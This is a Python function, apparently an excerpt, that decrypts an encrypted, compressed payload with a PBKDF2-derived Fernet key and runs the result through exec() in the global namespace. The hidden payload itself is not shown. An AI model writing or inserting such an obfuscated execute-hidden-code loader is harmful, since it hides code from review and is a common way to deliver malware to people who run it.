def decrypt_and_run():
    salt = base64.b64decode(salt_b64)
    passphrase = base64.b64decode(passphrase_b64).decode()
    kdf = PBKDF2HMAC(
        algorithm=hashes.SHA256(),
        length=32,
        salt=salt,
        iterations=100000,
    )
    key = base64.urlsafe_b64encode(kdf.derive(passphrase.encode()))
    cipher = Fernet(key)
    encrypted = base64.b64decode(payload)
    decrypted = cipher.decrypt(encrypted)
    decompressed = zlib.decompress(decrypted).decode('utf-8')
    # Execute in global namespace so all functions become globally defined
    exec(decompressed, globals())

